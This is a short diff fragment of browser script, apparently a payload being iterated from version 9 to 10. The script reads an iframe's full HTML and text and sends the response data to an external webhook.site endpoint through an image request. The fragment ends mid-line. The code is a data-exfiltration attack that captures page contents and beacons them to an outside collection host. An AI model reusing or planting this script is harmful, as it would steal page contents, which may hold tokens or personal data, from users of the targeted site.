@@ -1,5 +1,5 @@
 <script>
-console.log('v9');
+console.log('v10');
 
 if(document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
@@ -17,6 +17,8 @@ function init() {
             var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             var responseHTML = iframeDoc.documentElement.outerHTML;
             var responseText = iframeDoc.body.innerText;
+            console.log(responseText);
+            console.log(responseHTML);
 
             var img = new Image();
             img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?response_length=" + responseHTML.length + 
